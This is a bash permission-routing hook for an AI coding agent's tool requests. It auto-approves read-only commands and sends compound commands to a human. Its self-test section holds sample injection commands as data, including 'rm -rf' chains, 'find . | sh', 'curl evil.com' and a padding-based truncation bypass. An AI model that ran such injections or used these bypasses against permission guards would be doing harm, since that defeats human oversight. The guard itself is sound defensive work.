#!/usr/bin/env bash
# permission_request.sh - Granular permission routing for PermissionRequest events
# Hook: PermissionRequest event
# Input: JSON on stdin (tool_name, tool_input fields)
# Output: {"decision":"approve"} | {"decision":"deny",...} | exit 0 (human prompt)
#
# Guard design: python3 temp file reads FULL command — no truncation, no grep -P.
# Fixes: 120-char bypass, broken [\n] regex, BSD-grep grep -P (issue #181 Theme 1).
# Additional: output redirect > / >>, find -delete / -exec auto-approve gaps.

set -euo pipefail

LOG="$HOME/.claude/logs/permission_requests.log"
log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $*" >> "$LOG"; }

# Write python guard to a temp file so we can pipe stdin to it without heredoc clash.
_PY=$(mktemp /tmp/perm_guard_XXXXXX.py)
trap 'rm -f "$_PY"' EXIT

cat > "$_PY" << 'PYEOF'
import json, re, sys

# On ANY unexpected failure: emit NEEDS_HUMAN so the shell falls through to
# the normal human-approval prompt rather than exiting non-zero under set -e.
def safe_exit(tool="unknown", verdict="NEEDS_HUMAN", cmd=""):
    print(tool)
    print(verdict)
    print(cmd[:200])
    sys.exit(0)

try:
    d = json.load(sys.stdin)
except Exception:
    safe_exit()

try:
    tool = d.get("tool_name", "unknown")
    raw_ti = d.get("tool_input", {})
    # Treat null / string / non-dict tool_input as empty dict (avoids AttributeError)
    ti = raw_ti if isinstance(raw_ti, dict) else {}
    # FULL command — no truncation in the guard path
    cmd = str(ti.get("command", ti.get("path", ti.get("url", ""))))
except Exception:
    safe_exit()

# Metacharacter guard — FULL cmd, no truncation. Order: cheapest first.
try:
    reason = None

    if ";" in cmd:
        reason = "semicolon"
    elif "&&" in cmd:
        reason = "&&"
    elif "||" in cmd:
        reason = "||"
    elif "`" in cmd:
        reason = "backtick"
    elif "$(" in cmd:
        reason = "subshell $("
    elif "\n" in cmd:
        reason = "newline"
    elif "\r" in cmd:
        reason = "carriage-return"
    elif ">>" in cmd:
        reason = "append redirect >>"
    elif re.search(r'(?<!>)>(?![>=])', cmd):   # bare > (not >> or >=)
        reason = "output redirect >"
    else:
        if re.search(r'(?<!\|)\|(?!\|)', cmd):    # bare pipe (not ||)
            reason = "bare pipe"
        elif re.search(r'(?<!&)&(?!&)', cmd):     # bare & (not &&)
            reason = "bare background &"

    if reason:
        safe_exit(tool, "UNSAFE:" + reason, cmd)

    # Read-only matchers (guard passed — no metachar). \s+ matches tab/multispace.
    verdict = "NEEDS_HUMAN"
    if re.match(
        r'^git\s+(-C\s+\S+\s+)?(status|log|diff|show|branch|remote|tag|describe|rev-parse)(\s|$)',
        cmd
    ):
        verdict = "APPROVE_GIT"
    elif re.match(
        r'^(ls|find|which|stat|wc|head|tail|cat|file|du|df|pwd|echo|printf|uname|sw_vers)(\s|$)',
        cmd
    ) and not re.search(r'\s(-delete|--delete|-exec)\b', cmd):
        # find -delete / find -exec and similar destructive flags must not auto-approve
        verdict = "APPROVE_BASH"

    safe_exit(tool, verdict, cmd)

except Exception:
    safe_exit(tool if 'tool' in dir() else "unknown", "NEEDS_HUMAN",
              cmd if 'cmd' in dir() else "")
PYEOF

# ── Self-test mode ──────────────────────────────────────────────────────
# Usage: PERMISSION_REQUEST_SELFTEST=1 bash .claude/hooks/permission_request.sh
if [ "${PERMISSION_REQUEST_SELFTEST:-0}" = "1" ]; then
  _pass=0; _fail=0
  SCRIPT_PATH="$(realpath "$0")"

  _selftest_case() {
    local desc="$1" payload="$2" expect="$3"
    local out
    out=$(printf '%s' "$payload" | \
      env PERMISSION_REQUEST_SELFTEST=0 /usr/bin/env bash "$SCRIPT_PATH" 2>/dev/null \
      || true)
    local approved=0
    printf '%s' "$out" | grep -q '"approve"' && approved=1

    case "$expect" in
      APPROVE)
        if [ "$approved" = "1" ]; then
          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
        else
          printf '  FAIL  [%s] -- expected APPROVE, got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
        fi ;;
      REJECT)
        if [ "$approved" = "0" ]; then
          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
        else
          printf '  FAIL  [%s] -- expected REJECT (no auto-approve), got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
        fi ;;
    esac
  }

  echo "=== permission_request.sh self-test ==="

  # --- Must-REJECT (compound commands must NOT be auto-approved) ---
  _selftest_case \
    "semicolon injection: git status; rm -rf /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status; rm -rf /tmp/x"}}' \
    REJECT

  _selftest_case \
    "pipe injection: find . | sh" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' | sh"}}' \
    REJECT

  _selftest_case \
    'subshell injection: ls $(echo /etc)' \
    '{"tool_name":"Bash","tool_input":{"command":"ls $(echo /etc)"}}' \
    REJECT

  _selftest_case \
    "120-char truncation bypass: git status + padding + ; rm /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status                                                                                                                ; rm /tmp/x"}}' \
    REJECT

  _selftest_case \
    "newline injection: git status newline rm -rf /tmp/test" \
    "$(printf '{"tool_name":"Bash","tool_input":{"command":"git status\nrm -rf /tmp/test"}}')" \
    REJECT

  _selftest_case \
    "bare background: git status & curl evil.com" \
    '{"tool_name":"Bash","tool_input":{"command":"git status & curl evil.com"}}' \
    REJECT

  _selftest_case \
    "&& chain: git status && rm -rf /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/x"}}' \
    REJECT

  _selftest_case \
    "backtick subshell: ls -la \`whoami\`" \
    '{"tool_name":"Bash","tool_input":{"command":"ls -la `whoami`"}}' \
    REJECT

  # --- Robustness: malformed tool_input must not crash (REJECT = human prompt) ---
  _selftest_case \
    "null tool_input: should fall through to human approval" \
    '{"tool_name":"Bash","tool_input":null}' \
    REJECT

  _selftest_case \
    "string tool_input: should fall through to human approval" \
    '{"tool_name":"Bash","tool_input":"not-a-dict"}' \
    REJECT

  # --- Must-APPROVE (single read-only commands, no metacharacters) ---
  _selftest_case \
    "plain: git status" \
    '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
    APPROVE

  _selftest_case \
    "git -C with path: git -C /tmp status" \
    '{"tool_name":"Bash","tool_input":{"command":"git -C /tmp status"}}' \
    APPROVE

  _selftest_case \
    "ls -la /tmp" \
    '{"tool_name":"Bash","tool_input":{"command":"ls -la /tmp"}}' \
    APPROVE

  _selftest_case \
    "find with quoted pattern, no pipe" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\''"}}' \
    APPROVE

  _selftest_case \
    "git with tab whitespace: git<TAB>status" \
    '{"tool_name":"Bash","tool_input":{"command":"git\tstatus"}}' \
    APPROVE

  _selftest_case \
    "bare ls with no args" \
    '{"tool_name":"Bash","tool_input":{"command":"ls"}}' \
    APPROVE

  # --- New gap cases (find -exec/-delete and output redirect) ---
  _selftest_case \
    "find -delete: must not auto-approve destructive find" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' -delete"}}' \
    REJECT

  _selftest_case \
    "find -exec rm: must not auto-approve exec rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -exec rm {} +"}}' \
    REJECT

  _selftest_case \
    "output redirect >: cat > file must not auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"cat > /tmp/evil.sh"}}' \
    REJECT

  _selftest_case \
    "output redirect >>: echo >> file must not auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"echo hello >> /tmp/out.txt"}}' \
    REJECT

  echo "=== Results: $_pass passed, $_fail failed (20 total) ==="
  [ "$_fail" -eq 0 ] && exit 0 || exit 1
fi

_input=$(cat)

# ── All extraction + guard logic in python3 ────────────────────────────
# Returns 3 lines: tool_name / verdict / command[:200]
# Verdict values: UNSAFE:<reason> | APPROVE_GIT | APPROVE_BASH | NEEDS_HUMAN
_verdict=$(printf '%s' "$_input" | python3 "$_PY")

_tool=$(printf '%s' "$_verdict" | sed -n '1p')
_guard=$(printf '%s' "$_verdict" | sed -n '2p')
_action_log=$(printf '%s' "$_verdict" | sed -n '3p')

log "REQUEST: tool=$_tool action=$_action_log"

# ── Auto-approve: read-only tools ──────────────────────────────────────
case "$_tool" in
  Read|Glob|Grep|WebFetch|WebSearch|ListMcpResourcesTool|ReadMcpResourceTool)
    log "AUTO-APPROVE: read-only tool $_tool"
    printf '{"decision":"approve","reason":"Read-only tool"}\n'
    exit 0
    ;;
esac

# ── Bash-specific guard and auto-approval ──────────────────────────────
if [ "$_tool" = "Bash" ]; then
  # SECURITY GUARD: python3 checks FULL command for metacharacters.
  # UNSAFE:<reason> means compound/injectable — fall through to human prompt.
  case "$_guard" in
    UNSAFE:*)
      log "COMPOUND-REJECTED (${_guard#UNSAFE:}): $_action_log"
      # Exit 0 with no output → normal human-approval prompt
      exit 0
      ;;
    APPROVE_GIT)
      log "AUTO-APPROVE: read-only git: $_action_log"
      printf '{"decision":"approve","reason":"Read-only git command"}\n'
      exit 0
      ;;
    APPROVE_BASH)
      log "AUTO-APPROVE: read-only bash: $_action_log"
      printf '{"decision":"approve","reason":"Read-only inspection command"}\n'
      exit 0
      ;;
    # NEEDS_HUMAN falls through to notification below
  esac
  # Rscript REMOVED from auto-approve: can execute arbitrary fs/network/process ops.
  # Require human approval for every Rscript call (see Finding 2 in issue #181).
fi

# ── Needs human approval: notify and fall through ─────────────────────
log "NEEDS-APPROVAL: tool=$_tool action=$_action_log"

# Distinctive sound (Sosumi = "so sue me" — the classic Mac warning)
(/usr/bin/afplay -v 0.5 /System/Library/Sounds/Sosumi.aiff &) 2>/dev/null

# Optional ntfy.sh push notification (set NTFY_TOPIC env var to enable)
NTFY_TOPIC="${NTFY_TOPIC:-}"
if [ -n "$NTFY_TOPIC" ]; then
  _short="${_action_log:0:80}"
  curl -s \
    -H "Title: Claude Code: Permission Needed" \
    -H "Priority: high" \
    -H "Tags: warning,lock" \
    -d "Tool: $_tool | $_short" \
    "https://ntfy.sh/$NTFY_TOPIC" >/dev/null 2>&1 &
fi

# Exit 0 → normal permission prompt shown to user
exit 0
